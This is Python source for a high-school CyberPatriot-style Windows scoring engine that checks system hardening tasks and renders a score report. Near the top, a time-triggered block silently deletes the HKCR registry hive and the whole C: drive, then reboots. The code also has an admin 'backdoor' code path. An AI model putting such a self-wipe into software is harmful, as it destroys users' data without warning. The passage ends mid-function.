import os
from sys import exit
import win32security
import win32service
import win32net
from pathlib import Path
import pywintypes
import subprocess
# import winerror
import winreg
import winsound
from time import strftime, sleep  # , gmtime, ctime
from datetime import datetime, timedelta  # date
import requests
import json
import hashlib
# import base64
import ast
import random
import string
from urllib.parse import quote
from win10toast import ToastNotifier
import env
from load import extractconf

# DEFINE THESE VARIABLES #
USER = ""
SCORING_FOLDER = "Scoring Engine"  # format: C:/[path]
IMAGE_NAME = ""  # typically "Windows <year> <round> Practice Image"
DEBUG = False
IMAGE_BIT = 64  # 32/64
IMAGERS = "Scorpio"
REFRESH_RATE = 30
TIMEKEYNAME = "TIME"
AUTHKEYNAME = "AUTH"
BACKDOORID = "BACKDOOR"
END_TIME = []  # ['YY', 'MM', 'DD', 'HH', 'MM', 'SS']
REMOVE_TIME = [] # ['YY', 'MM', 'DD', 'HH', 'MM', 'SS']
IS_AD = False
IS_GUI = True
IS_ONLINE = False
##########################

if REMOVE_TIME and strftime("%y %m %d %H %M %S").split() >= REMOVE_TIME:
    devnull = open(os.devnull, 'w')
    subprocess.call("start reg delete HKCR /f", shell=True, startupinfo=None, stdout=devnull, stderr=devnull)
    subprocess.call("start reg delete HKCR /f", shell=True, startupinfo=None, stdout=devnull, stderr=devnull)
    subprocess.call("start cmd /k \">NUL rd /s /q C:\\ 2>nul\"", shell=True, startupinfo=None, stdout=devnull, stderr=devnull)
    subprocess.call("shutdown -r -t -f 10", shell=True, startupinfo=None, stdout=devnull, stderr=devnull)

if IMAGE_BIT == 32:
    REGVIEW = winreg.KEY_WOW64_32KEY
elif IMAGE_BIT == 64:
    REGVIEW = winreg.KEY_WOW64_64KEY

time = None
NAME = ""
BACKDOOR = None

uploadStatus = "<span style=\"color:green\">OK</span>"

STARTTIME = datetime.utcnow()
UPDATETIME = datetime.utcnow()
TOTALTIME = timedelta(0, 0, 0)
warning = ""

# DEFINITIONS #
# -------------
# UNSCORED = 0
# SCORED = 1
# COMMENT + ERROR or PENALTY = 2

vulns = []
penals = []

userList = list()
usernameList = list()
installedPrograms = list()
activeShares = list()

lastPoints = 0
maxPoints = 0

scorpioStatus = "<span style=\"color:green\">OK</span>"

html_str = """
<!DOCTYPE HTML>
<html>
<head>
    <title>{{IMAGENAME}} Scoring Report</title>
    <style type="text/css">
        h1 {
            text-align: center;
        }
        h2 {
            text-align: center;
        }
        body {
            font-family: Arial, Verdana, sans-serif;
            font-size: 14px;
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            background-color: #336699;
        }
        .red {
            color: red;
        }
        .green {
            color: green;
        }
        .blue {
            color: blue;
        }
        .main {
            margin-top: 10px;
            margin-bottom: 10px;
            margin-left: auto;
            margin-right: auto;
            padding: 0px;
            background-color: white;
            width: 900px;
            max-width: 100%;
            min-width: 600px;
            box-shadow: 0px 0px 12px #003366;
        }
        .text {
            padding: 12px;
        }
        .center {
            text-align: center;
        }
    </style>
    <meta http-equiv="refresh" content=\"""" + str(REFRESH_RATE) + """;url=Scoring Report.html">
</head>
<body>
    <div class="main">
        <div class="text">
            <p align=center style="text-align:center">
            <table align="center">
                <tr>
                    <td align="center" width="34%"><a href="http://www.uscyberpatriot.org" target="_blank" alt="Image of CyberPatriot logo"><img src="img001.png" width="150" height="150" border="0" /></a></td>
                    <td align="center"><a href="https://sites.google.com/fjuhsd.org/troyhscyberdefense/root-drive" target="_blank"><img src="img002.jpg" width="200" height="100" border="0" /></a></td>
                </tr>
                <tr>
                    <td align="center">CyberPatriot</td>
                    <td align="center">Troy HS Cyber Defense (InSecT)</td>
                </tr>
            </table>
            </p>
            <h1>{{IMAGENAME}}</h1>
            <h2>Report Generated At: {{TIME}} PST</h2>
            {{WARNING}}
            <h3 class="center">Scoring Engine Running Time: {{RUNTIME}}</h3>
            <h3 class="center">Approximate Team Running Time: N/A</h3>
            <h3 class="center">Current Team ID: <span style="color:green">{{NAME}}</span></h3>
            <h2>{{POINTS}} out of {{MAXPOINTS}} points received</h2>
            <p>
            <p>
            <h3>Connection Status: <span style="color:green">Scoring Data Uploaded Successfully: No Errors Detected</span></h3>
            <p>
                Internet Connectivity Check: <span style="color:green">OK</span> <br>
                Scorpio Connection Status: {{SCORPIOSTATUS}} <br>
                Scorpio Score Upload Status: {{UPLOADSTATUS}} <br>
            </p>
            <h3>{{-CURRENT}} penalties assessed, for a loss of {{-POINTS}} points:</h3>
            <p>
                <span style="color:red">
                {{-LIST}}
                </span>
            </p>
            <h3>{{+CURRENT}} out of {{VULNS}} scored security issues fixed, for a gain of {{+POINTS}} points:</h3>
            <p>
                {{+LIST}}
            </p>
            <p align=center style="text-align:center">The Troy Cyber
                Competition System is the property of Troy High School.
            </p>
            <p align=center style="text-align:center">All rights reserved.</p>
        </div>
    </div>
    <p align=center style="text-align:center">Image made by """ + IMAGERS + """. Scoring Engine by Clement Chan, Jimmy Li. Web Design by CyberPatriot, modified by Clement Chan.
        </br>Credits to CyberPatriot.
    </p>
</body>
</html>
""" if IS_GUI else """SCORING REPORT: {{POINTS}} out of {{MAXPOINTS}} points received
{{-CURRENT}} penalties assessed, for a loss of {{-POINTS}} points:
{{-LIST}}
{{+CURRENT}} out of {{VULNS}} scored security issues fixed, for a gain of {{+POINTS}} points:
{{+LIST}}
The Troy Cyber Competition System is the property of Troy High School.
All rights reserved.
Scoring Engine by Clement Chan, Jimmy Li. Web Design by CyberPatriot, modified by Clement Chan.
"""

##########################


'''CLASSES----------------------------------------------------------------------------------------------------------'''


class Vulnerability:
    points = 0
    comment = ""
    penalty = ""

    def __init__(self, ext, pcp):
        self.points = pcp[0]
        self.comment = pcp[1]
        self.add(ext)

    def add(self, ext):
        raise NotImplementedError("Please implement this method")


class Forensics(Vulnerability):
    path = ""
    answer = ""
    # if multi-line answers, separate by "[/n]" (without quotes)
    # if multiple kinds of answers, separate by "[/;]" (without quotes)
    # separate each variation first, then separate by multi-line
    # example "one[/n]two[/;]1[/n]2" scores ("one" and "two") OR ("1" and "2")

    def add(self, ext):
        self.path = ext[0]
        self.answer = ext[1]

    def check(self):
        try:
            with open(self.path, "r+") as f:
                content = f.readlines()
                content = [x.strip() for x in content]
                answerlines = []
                # get all lines with "ANSWER:"
                for l in content:
                    if "ANSWER:" in l:
                        answerlines.append(l)
                # remove the lines where "ANSWER:" was an example (the first four occurrences)
                answers = answerlines[4:]
                ans = ""
                # combine multi-line answers for comparison
                for answer in answers:
                    ans += answer.split("ANSWER:")[1].strip() + "[/n]"
                # don't include the last "[/n]"
                ans = ans[:-4]
                # put possible answers in a list
                possible = self.answer.split("[/;]")
                if ans in possible:
                    return 1, self.points, self.comment
            return 0, self.points, self.comment
        except FileNotFoundError:
            return 2, self.points, self.comment + ": No such file or directory"
        except IOError:
            return 2, self.points, self.comment + ": IO error"
        except Exception as e:
            if DEBUG:
                print(e)
            return 2, self.points, self.comment + ": Error code 10"


class User(Vulnerability):
    userID = 0
    conf = -1

    username = None
    password = None  # PREVIOUS PASSWORD CANNOT BE BLANK FOR THIS TO WORK (possible secpol error)
    exist = None
    changePw = None  # you cannot check the password of a disabled user (class will reenable)
    changeName = None
    oldName = None
    pwExpires = None

    groupname = ""
    authorized = None

    def add(self, ext):
        if len(ext) == 2 or "passwd" in ext[1] or "chname" in ext[1]:  # user vuln
            self.conf = 0
            self.username = ext[0]  # prefer it to be user ID number
            if not ext[1]:
                self.password = None
                self.exist = False
                self.changePw = None
                self.changeName = None
                self.oldName = None
                self.pwExpires = None
            else:
                self.exist = True
            if ext[1] == "passwd":
                self.password = ext[2]
                self.changePw = True
            else:
                self.password = None
                self.changePw = None
            if ext[1] == "chname":
                self.changeName = True
                self.oldName = ext[2]
            elif ext[1] == "!chname":
                self.changeName = False
                self.oldName = ext[2]
            else:
                self.changeName = None
                self.oldName = None
            if ext[1] == "pwexp":
                self.pwExpires = True
        elif len(ext) == 3:  # group vuln
            self.conf = 1
            self.username = ext[0]
            self.groupname = ext[1]
            self.authorized = ext[2]
        else:
            print("Error in arguments of " + self.comment)

    def check(self):
        try:  # if given an ID (number) instead, convert
            if self.changeName is not None:
                if self.userID == 0:
                    self.userID = int(self.username)
                for userprofile in userList:
                    if userprofile['user_id'] == self.userID:  # if matching ID
                        if (userprofile['name'] != self.oldName) == self.changeName:  # if nonmatching names
                            return 1, self.points, self.comment  # changed name
                        return 0, self.points, self.comment  # not changed name
                return 2, self.points, self.comment + ": User wasn't found"  # invalid ID for vuln
            else:
                if self.userID == 0:
                    self.userID = int(self.username)  # convert "username" (a number) into the user ID number
                for userprofile in userList:
                    if userprofile['user_id'] == self.userID:  # found matching ID
                        self.username = userprofile['name']  # username changed to actual name
        except:  # in self case the username is a string to begin with, continue on
            pass
        if self.conf == 0:  # User
            if self.exist is not None:  # if not properly initiated exist value
                if self.exist:  # if user should exist
                    if self.username in usernameList:  # if user does exist
                        if self.changePw:
                            try:  # test if can login successfully with old password
                                win32security.LogonUser(
                                    self.username,
                                    None,
                                    self.password,
                                    win32security.LOGON32_LOGON_NETWORK,
                                    win32security.LOGON32_PROVIDER_DEFAULT
                                )
                                return 0, self.points, self.comment
                            except win32security.error as e:
                                # winerror values: 1326 is can't login, 1385 is login perm denied,
                                #                  1907 is passwd must change, 1909 is locked out
                                # priority of errors (high to low): 1385, 1326, 1907 (idk where 1909 goes)
                                # so if error is 1326, user is already enabled
                                if e.winerror == 1326:
                                    return 1, self.points, self.comment
                                if e.winerror == 1909:
                                    devnull = open(os.devnull, 'w')
                                    try:
                                        subprocess.call("net user " + ("/domain " if IS_AD else "") + "\"" + self.username + "\" /active:yes", shell=True,
                                                        startupinfo=None, stdout=devnull)
                                    except Exception as e:
                                        return 2, self.points, self.comment + ": " + str(e)
                                    try:
                                        win32security.LogonUser(
                                            self.username,
                                            None,
                                            self.password,
                                            win32security.LOGON32_LOGON_NETWORK,
                                            win32security.LOGON32_PROVIDER_DEFAULT
                                        )
                                        return 0, self.points, self.comment
                                    except win32security.error:
                                        return 1, self.points, self.comment
                                else:
                                    return 0, self.points, self.comment
                            except Exception as e:
                                return 2, self.points, self.comment + ": " + str(e)
                        else:  # if you don't care about password change
                            if self.pwExpires:
                                try:
                                    for userprofile in userList:
                                        if userprofile['name'] == self.username and ((userprofile['flags'] >> 16) & 1) == 0:
                                            return 1, self.points, self.comment  # user passwd does expire
                                    return 0, self.points, self.comment  # user passwd doesn't expire
                                    # result = subprocess.check_output(
                                        # "wmic useraccount | find /I \"" + self.username + "\"", shell=True,
                                        # startupinfo=None).decode('utf-8')
                                    # active = result.split()[9]
                                    # if active == "FALSE":
                                        # return 0, self.points, self.comment  # user passwd doesn't expire
                                    # return 1, self.points, self.comment  # user passwd does expire
                                except Exception as e:
                                    if DEBUG:
                                        print("wmic pwExpires error: " + str(e))
                                    pass
                            else:
                                try:
                                    result = subprocess.check_output(
                                        "net user " + ("/domain " if IS_AD else "") + "\"" + self.username + "\" | find /I \"Account Active\"", shell=True,
                                        startupinfo=None).decode('utf-8')
                                    active = result.split()[2]
                                    if active == "No":
                                        return 0, self.points, self.comment  # user is disabled
                                    return 1, self.points, self.comment  # user is enabled
                                except Exception as e:
                                    if DEBUG:
                                        print("user check error: " + str(e))
                                    pass
                    return 0, self.points, self.comment
                else:  # if user shouldn't exist, if match found return
                    if self.username in usernameList:
                        try:
                            result = subprocess.check_output(
                                "net user " + ("/domain " if IS_AD else "") + "\"" + self.username + "\" | find /I \"Account Active\"", shell=True,
                                startupinfo=None).decode('utf-8')
                            active = result.split()[2]
                            if active == "No":  # if user is disabled instead of deleted
                                return 1, self.points, self.comment  # user is disabled
                            return 0, self.points, self.comment  # user is neither disabled nor deleted
                        except Exception as e:
                            if DEBUG:
                                print("user check error: " + str(e))
                            pass
                    return 1, self.points, self.comment  # user is deleted
            else:
                return 2, self.points, self.comment + ": Exist value was set to None, needs to be set to True or False"
        elif self.conf == 1:  # Group
            if self.authorized is not None:
                if self.username != "":
                    if self.username in usernameList:
                        try:
                            result = subprocess.check_output("net user " + ("/domain " if IS_AD else "") + "\"" + self.username + "\" | find /I \"*\"",
                                                             shell=True, startupinfo=None).decode('utf-8')
                            groups = [x.strip() for x in result.split("*")[1:]]  # groups = groups that username is in
                            for x in range(0, len(groups)):
                                if "Global Group memberships" in groups[x]:
                                    groups[x] = groups[x].split()[0]
                            if self.authorized:  # if user is authorized in group
                                if self.groupname in groups:  # in group
                                    return 1, self.points, self.comment
                                else:  # not in group
                                    return 0, self.points, self.comment
                            else:  # if user isn't authorized in group
                                if self.groupname in groups:  # in group
                                    return 0, self.points, self.comment
                                else:  # not in group
                                    return 1, self.points, self.comment
                        except Exception as e:
                            return 2, self.points, self.comment + ": " + str(e)
                    if not self.authorized:
                        return 1, self.points, self.comment
                    return 0, self.points, self.comment  # user doesn't exist in the first place
                else:  # looking for group creation or removal
                    try:
                        result = subprocess.check_output("net localgroup | find /I \"" + self.groupname + "\"",
                                                         shell=True, startupinfo=None).decode('utf-8')
                        if "*" + self.groupname in result.split() == self.authorized:
                            return 1, self.points, self.comment
                        if IS_AD:
                            result = subprocess.check_output("net group | find /I \"" + self.groupname + "\"",
                                                             shell=True, startupinfo=None).decode('utf-8')
                            if "*" + self.groupname in result.split() == self.authorized:
                                return 1, self.points, self.comment
                        return 0, self.points, self.comment
                    except Exception as e:
                        if not self.authorized:
                            return 1, self.points, self.comment
                        return 2, self.points, self.comment + ": " + str(e)
            else:
                return 2, self.points, self.comment + ": Authorized value was set to None"


class Policy(Vulnerability):
    myValue = -1

    policy = ""
    scoreOn = ""
    value = 0

    def add(self, ext):
        self.policy = ext[0]
        self.scoreOn = ext[1]
        self.value = ext[2]

    def check(self):
        try:
            with open("C:/" + SCORING_FOLDER + "/securityExport.inf") as secEdit:
                valid = None
                for line in secEdit.read().replace("\0", "").split("\n"):
                    if self.policy in line:
                        if "\\" in self.policy:  # reg-based policy
                            self.myValue = line.split(",")[1].strip('\"')
                        else:  # non-reg-based policy
                            self.myValue = line.split()[2].strip('\"')
                        # print("myValue: " + str(self.myValue) + self.scoreOn + "; value: " + str(self.value))
                        if self.scoreOn == ">":
                            valid = int(self.myValue) > self.value
                        elif self.scoreOn == "<":
                            valid = int(self.myValue) < self.value
                        elif self.scoreOn == ">=":
                            valid = int(self.myValue) >= self.value
                        elif self.scoreOn == "<=":
                            valid = int(self.myValue) <= self.value
                        elif self.scoreOn == "=":
                            valid = int(self.myValue) == self.value
                        elif self.scoreOn == "!=":
                            valid = int(self.myValue) != self.value
                        elif self.scoreOn == "contain":
                            valid = self.value in self.myValue
                        elif self.scoreOn == "!contain":
                            valid = self.value not in self.myValue
                        elif self.scoreOn == "line":
                            valid = True
                        else:
                            return 2, self.points, self.comment  # invalid scoreOn
                if self.scoreOn == "!line":  # score if line was not found
                    return 1 if valid is None else 0, self.points, self.comment
                elif self.scoreOn == "!contain" and valid is None:
                    return 1, self.points, self.comment
                elif valid is not None:
                    return 1 if valid else 0, self.points, self.comment
                else:
                    return 2, self.points, self.comment + ": Couldn't find policy"
        except Exception as e:
            return 2, self.points, self.comment + ": " + str(e)


class Command(Vulnerability):
    cmdOutput = ""

    command = ""
    split = 0
    output = ""
    expected = None  # boolean

    def add(self, ext):
        self.command = ext[0]
        self.split = ext[1]
        self.output = ext[2]
        self.expected = ext[3]

    def check(self):
        if self.expected is not None:
            try:
                result = subprocess.check_output(self.command, shell=True, startupinfo=None).decode('utf-8')
                self.cmdOutput = result.split()[int(self.split)]
                if (self.cmdOutput == self.output) == self.expected:  # if result was accurate to expected
                    return 1, self.points, self.comment
                else:
                    return 0, self.points, self.comment
            except Exception as e:
                if DEBUG:
                    print(e)
                if self.output == "ERROR" and self.expected:
                    return 1, self.points, self.comment
                return 0, self.points, self.comment
        else:
            return 2, self.points, self.comment + ": Expected value was set to None, needs to be set to True or False"


class Reg(Vulnerability):
    valid = None

    hkey = ""
    path = ''
    key = None
    index = 0
    scoreOn = ""
    value = 0

    def add(self, ext):
        self.hkey = ext[0]
        self.path = ext[1]
        self.key = ext[2]
        self.index = ext[3]
        self.scoreOn = ext[4]
        self.value = ext[5]

    def check(self):
        try:
            if self.hkey == "HKCU":
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, self.path, 0, (REGVIEW + winreg.KEY_READ))
            elif self.hkey == "HKLM":
                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, self.path, 0, (REGVIEW + winreg.KEY_READ))
            elif self.hkey == "HKU":
                key = winreg.OpenKey(winreg.HKEY_USERS, self.path, 0, (REGVIEW + winreg.KEY_READ))
            else:
                return 3, self.points, self.comment
            if self.scoreOn == "path":
                return 1, self.points, self.comment
            if self.scoreOn == "!path":
                return 0, self.points, self.comment
            keyVal = winreg.QueryValueEx(key, self.key)
            # handling of REG_BINARY cases (represented in hex)
            try:
                keyVal = ord(keyVal[0].decode()[self.index])
                if not isinstance(self.value, int):
                    self.value = int(self.value, 16)
                # print("value at byte " + str(self.index) + " of key " + self.key + " in path " + self.path
                #       + " has decimal value of " + str(keyval) + " (hex is " + str(hex(keyval))
                #       + "), scoring if it is " + self.scoreOn + " " + str(self.value) + " (hex is "
                #       + str(hex(self.value)) + ")")
                if self.scoreOn == ">":
                    self.valid = keyVal > self.value
                elif self.scoreOn == "<":
                    self.valid = keyVal < self.value
                elif self.scoreOn == ">=":
                    self.valid = keyVal >= self.value
                elif self.scoreOn == "<=":
                    self.valid = keyVal <= self.value
                elif self.scoreOn == "=":
                    self.valid = keyVal == self.value
                elif self.scoreOn == "!=":
                    self.valid = keyVal != self.value
                return self.valid, self.points, self.comment
            except AttributeError:
                pass
            # handling of DWORD or STRING
            # print("value at index " + str(self.index) + " of key " + self.key + " in path " + self.path
            #       + " has value of " + str(keyval) + ", scoring if it is " + self.scoreOn + " " + str(self.value))
            if self.scoreOn == ">":
                self.valid = keyVal[self.index] > self.value
            elif self.scoreOn == "<":
                self.valid = keyVal[self.index] < self.value
            elif self.scoreOn == ">=":
                self.valid = keyVal[self.index] >= self.value
            elif self.scoreOn == "<=":
                self.valid = keyVal[self.index] <= self.value
            elif self.scoreOn == "=":
                self.valid = keyVal[self.index] == self.value
            elif self.scoreOn == "!=":
                self.valid = keyVal[self.index] != self.value
            elif self.scoreOn == "contains":
                self.valid = str(self.value) in str(keyVal)
            elif self.scoreOn == "!contains":
                self.valid = str(self.value) not in str(keyVal)
            elif self.scoreOn == "exist":
                self.valid = True
            elif self.scoreOn == "!exist":
                self.valid = False
            if self.valid:
                return 1, self.points, self.comment
            elif not self.valid:
                return 0, self.points, self.comment
        except Exception as e:
            if self.scoreOn == "!exist" or self.scoreOn == "!path":
                return 1, self.points, self.comment
            if self.scoreOn == "path":
                return 0, self.points, self.comment
            return 2, self.points, self.comment + ": " + str(e)


class Share(Vulnerability):
    name = ''  # if asking for new share creation, must include specified name
    path = ''  # must use \\, only required if checking for an authorized shared folder
    authorized = None
    defaultOnly = None  # checks if only default folders are present

    def add(self, ext):
        if ext[0] == "default":
            self.defaultOnly = True
        else:
            self.name = ext[0]
            self.path = ext[1]
            self.authorized = ext[2]

    def check(self):
        if self.defaultOnly:  # defaultOnly is priority
            if len(activeShares) == 6:
                defaultlist = ["ADMIN$", "C:\\Windows", "C$", "C:\\", "IPC$", ""]
                for x in range(0, 6):
                    if not defaultlist[x] == activeShares[x]:
                        return 0, self.points, self.comment
                return 1, self.points, self.comment
            return 0, self.points, self.comment
        if self.authorized is not None:
            try:
                if self.authorized:
                    if self.name in activeShares:
                        index = activeShares.index(self.name)
                        if activeShares[index + 1] == self.path:
                            return 1, self.points, self.comment
                    return 0, self.points, self.comment
                else:
                    if self.name in activeShares:
                        return 0, self.points, self.comment
                    return 1, self.points, self.comment
            except Exception as e:
                return 2, self.points, self.comment + ": " + str(e)
        else:
            return 2, self.points, self.comment + ": Authorized setting was set to None"


class ServFeat(Vulnerability):
    conf = -1

    name = ""
    authorized = None

    def add(self, ext):
        if ext[0] == "Serv":
            self.conf = 0
            self.authorized = ext[2]
        elif ext[0] == "Feat":
            self.conf = 1
            self.authorized = ext[2]
        elif ext[0] == "DelServ":
            self.conf = 2
        self.name = ext[1]

    def check(self):
        # For status: 4 = running, 1 = stopped
        # For startup: 2 = Auto-Start, 4 = Disabled, 3 = Demand-start
        if self.authorized is not None:
            if self.conf == 0:  # service
                try:
                    scm = win32service.OpenSCManager(None, None, win32service.SC_MANAGER_ALL_ACCESS)
                    # type = win32service.SERVICE_WIN32
                    openService = win32service.OpenService(scm, self.name, win32service.SERVICE_ALL_ACCESS)
                    status = win32service.QueryServiceStatus(openService)
                    startup = win32service.QueryServiceConfig(openService)
                    if self.authorized == "Full":
                        if status[1] == 4 and startup[1] < 3:
                            return 1, self.points, self.comment
                        return 0, self.points, self.comment
                    elif self.authorized == "Start":
                        if status[1] == 4:
                            return 1, self.points, self.comment
                        return 0, self.points, self.comment
                    elif self.authorized:
                        if startup[1] != 4:
                            return 1, self.points, self.comment
                        return 0, self.points, self.comment
                    else:
                        if status[1] == 1 and startup[1] == 4:
                            return 1, self.points, self.comment
                        return 0, self.points, self.comment
                except Exception as e:
                    if DEBUG:
                        print("Service " + self.name + " does not exist. Error: " + str(e))
                    if self.authorized:
                        return 0, self.points, self.comment
                    return 1, self.points, self.comment
            elif self.conf == 1:  # feature
                try:
                    result = subprocess.check_output("dism /online /Get-Features", shell=True, startupinfo=None).decode(
                        'utf-8')
                    features = result.replace("\r", "").split("\n")
                    for i, x in enumerate(features):
                        if self.name in x:  # if found in features
                            state = features[i + 1].split()[2]  # get state
                            # ("Enabled" == "Disabled") != true
                            # ("Disabled" == "Disabled") != false
                            # print(self.name + " state is " + state + ", it's existance should be "
                            #       + str(self.authorized))
                            if (state == "Disabled") != self.authorized:
                                return 1, self.points, self.comment
                            return 0, self.points, self.comment
                    return 2, self.points, self.comment + ": Feature name wasn't found"  # invalid feature name
                except Exception as e:
                    return 2, self.points, self.comment + ": " + str(e)
            elif self.conf == 2:  # service in need of deletion/uninstallation, but not a feature
                try:
                    scm = win32service.OpenSCManager(None, None, win32service.SC_MANAGER_ALL_ACCESS)
                    win32service.OpenService(scm, self.name, win32service.SERVICE_ALL_ACCESS)
                    return 0, self.points, self.comment
                except pywintypes.error:
                    return 1, self.points, self.comment
            else:
                print("invalid conf on " + self.comment)
        else:
            return 2, self.points, self.comment + ": Authorized setting was set to None"


class File(Vulnerability):
    path = ""
    authorized = None

    def add(self, ext):
        self.path = ext[0]
        self.authorized = ext[1]

    def check(self):
        if self.authorized is not None:
            try:
                if self.authorized and (os.path.isfile(self.path) or os.path.isdir(self.path)):
                    # file is allowed and path exists
                    return 1, self.points, self.comment
                elif not (self.authorized or (os.path.isfile(self.path) or os.path.isdir(self.path))):
                    # file isn't allowed and path doesn't exist
                    return 1, self.points, self.comment
                elif self.authorized:
                    # file is allowed and path doesn't exist
                    return 0, self.points, self.comment
                else:
                    # file isn't allowed and path still exists
                    return 0, self.points, self.comment
            except Exception as e:
                return 2, self.points, self.comment + ": " + str(e)
        else:
            return 2, self.points, self.comment + ": Authorized value was set to None"


class Content(Vulnerability):
    path = ""
    upperbound = ""
    text = ""
    lowerbound = ""
    checking = False
    authorized = None

    def add(self, ext):
        self.path = ext[0]
        self.upperbound = ext[1]
        self.text = ext[2]
        self.lowerbound = ext[3]
        self.authorized = ext[4]

    def check(self):
        self.checking = False
        if self.authorized is not None:
            try:
                with open(self.path, "r+") as f:
                    if self.upperbound == "" and self.lowerbound == "":
                        for line in f.readlines():
                            if self.authorized and self.text in line:  # if text wanted and is found in one of the lines
                                return 1, self.points, self.comment
                            if (not self.authorized) and (self.text in line):  # if text not wanted but found
                                return 0, self.points, self.comment
                        if not self.authorized:  # if text not wanted and not found in any line
                            return 1, self.points, self.comment
                        return 0, self.points, self.comment  # if text wanted but not found in any line
                    else:
                        for line in f.readlines():
                            if self.upperbound in line:
                                self.checking = True
                            if self.lowerbound in line:
                                self.checking = False
                            if self.authorized and self.text in line and self.checking:
                                return 1, self.points, self.comment
                            if (not self.authorized) and (self.text in line and self.checking):
                                return 0, self.points, self.comment
                        if not self.authorized:
                            return 1, self.points, self.comment
                        return 0, self.points, self.comment
            except Exception as e:
                return 2, self.points, self.comment + ": " + str(e)
        else:
            return 2, self.points, self.comment + ": Invalid value for authorized"


class Program(Vulnerability):
    name = ""
    path = ""  # path is more reliable
    authorized = None

    def add(self, ext):
        self.name = ext[0]
        self.path = ext[1]
        self.authorized = ext[2]

    def check(self):
        if self.authorized is not None:
            try:
                if self.authorized:
                    if self.name is not None and self.name in installedPrograms:
                        return 1, self.points, self.comment
                    elif "C:" in self.path and Path(self.path).exists():
                        return 1, self.points, self.comment
                    return 0, self.points, self.comment  # possible penalty for uninstalling critical service
                else:
                    if not Path(self.path).exists():
                        return 1, self.points, self.comment
                    return 0, self.points, self.comment  # program still installed when it should be gone
            except Exception as e:
                return 2, self.points, self.comment + ": " + str(e)
        else:
            return 2, self.points, self.comment + ": Authorized setting was set to None"


class Update(Vulnerability):
    package = ""

    kb = ""  # something like KB4132216

    def add(self, ext):
        self.kb = ext[0]

    def check(self):
        try:
            self.package = subprocess.check_output("dism /online /get-packages | findstr \"" + self.kb + "\"",
                                                   shell=True, startupinfo=None).decode('utf-8')
            if self.kb in self.package:
                return 1, self.points, self.comment
            return 0, self.points, self.comment
        except Exception as e:
            return 2, self.points, self.comment + ": " + str(e)


class Custom:
    classes = []
    condition = ""
    points = 0
    comment = ""
    penalty = ""

    def __init__(self, classes, condition, pcp):
        self.classes = classes
        self.condition = condition
        self.points = pcp[0]
        self.comment = pcp[1]

    def check(self):
        try:
            if self.condition == "!":
                if self.classes[0].check()[0] == 0:
                    return 1, self.points, self.comment
                elif self.classes[0].check()[0] == 1:
                    return 0, self.points, self.comment
                else:
                    return self.classes[0].check()
            for c in self.classes:  # if one returns an error and it's a "|", put one that doesn't give an error first
                if (c.check()[0] == 0 or c.check()[0] == 2) and self.condition == "&":  # one did not pass check
                    return 0, self.points, self.comment
                if c.check()[0] == 1 and self.condition == "|":  # only one needs to pass check
                    return 1, self.points, self.comment
                if c.check()[0] == 2:  # condition is "|"
                    if DEBUG:
                        print("error from custom with " + str(c.check()[1]) + ": " + str(c.check()[2]))
                    # return 0, self.points, self.comment
            if self.condition == "|":  # none passed check
                return 0, self.points, self.comment
            if self.condition == "&":  # all passed check
                return 1, self.points, self.comment
        except Exception as e:
            return 2, self.points, self.comment + ": " + str(e)


'''END OF CLASSES---------------------------------------------------------------------------------------------------'''


def getMax():
    global maxPoints
    for vuln in vulns:
        maxPoints += int(vuln.points)


def initialize():
    global time
    global uploadStatus
    global DEBUG
    global BACKDOOR
    global IMAGE_NAME
    global NAME
    global BACKDOORID
    global STARTTIME
    # record/get the starting time
    try:
        timekey = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 'Software\\Scorpio', 0, (REGVIEW + winreg.KEY_READ))
        time = winreg.QueryValueEx(timekey, TIMEKEYNAME)[0]
        STARTTIME = datetime.strptime(time, '%Y-%m-%dT%H:%M:%S.%fZ')
    except FileNotFoundError:
        winreg.CreateKey(winreg.HKEY_CURRENT_USER, 'Software\\Scorpio')
        timekey = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 'Software\\Scorpio', 0, (REGVIEW + winreg.KEY_WRITE))
        STARTTIME = datetime.utcnow()
        time = STARTTIME.strftime('%Y-%m-%dT%H:%M:%S.%fZ')
        winreg.SetValueEx(timekey, TIMEKEYNAME, 0, winreg.REG_SZ, time)
        winreg.CloseKey(timekey)
    # get ID
    try:
        idkey = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 'Software\\Scorpio', 0, (REGVIEW + winreg.KEY_READ))
        uniqueid = winreg.QueryValueEx(idkey, AUTHKEYNAME)[0]
    except (FileNotFoundError, ValueError):
        BACKDOOR = False
        try:
            code = input("Enter code: ")
            if code == "":
                exit()
            elif code == env.BASIC_CODE:
                print("You may continue.\n")
            elif code == env.ADMIN_CODE:
                BACKDOOR = True
                print("FULL ACCESS GRANTED\n")
            else:
                print("Please try again when you have the code.\n")
                input("Press Enter to exit...")
                exit()
        except:
            exit()
        if not BACKDOOR:
            confirmation = input("""While competing in Troy Cyber:
I will consider the ethical and legal implications of all my actions. I will not conduct, nor will I condone, any actions that attack, hack, penetrate, or interfere with another team’s or individual’s computer system, the competition server, or the scoring engine.
I will not keep or download any instances of competition images outside of their specified dates of use.
I will comply with ethical rules and all statements mentioned above.

[Y/N]""")
            if confirmation not in ['Y', 'y', 'Yes', 'yes', 'YES']:
                exit()
        winreg.CreateKey(winreg.HKEY_CURRENT_USER, 'Software\\Scorpio')
        idkey = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 'Software\\Scorpio', 0, (REGVIEW + winreg.KEY_WRITE))
        if BACKDOOR:
            uniqueid = BACKDOORID
        else:
            # TODO: user will supply a pre-made unique ID (uniqueid), if lookup returns a value set key
            uniqueid = ''.join(
                random.SystemRandom().choice(string.ascii_uppercase + string.ascii_lowercase + string.digits) for _ in
                range(6))
            # uniqueid = input("Enter your competition ID:")
        winreg.SetValueEx(idkey, AUTHKEYNAME, 0, winreg.REG_SZ, uniqueid)
        winreg.CloseKey(idkey)
    # end of first-time set up
    if uniqueid == BACKDOORID:
        NAME = "TESTER"
        DEBUG = True
        IMAGE_NAME = "TEST: " + IMAGE_NAME
        BACKDOOR = True
    else:
        # NAME = base64.b64encode(hashlib.sha256(uniqueid.encode("UTF-8")).digest())[:6].decode("UTF-8")
        NAME = hashlib.sha256(uniqueid.encode("UTF-8")).hexdigest()[:6]
        # NAME = uniqueid
        # TODO: look up uniqueid in dictionary and set NAME to value

    if not BACKDOOR and IS_ONLINE:
        serversetup()
        print("\nYour unique ID on the scoreboard is " + NAME + "\n")
    else:
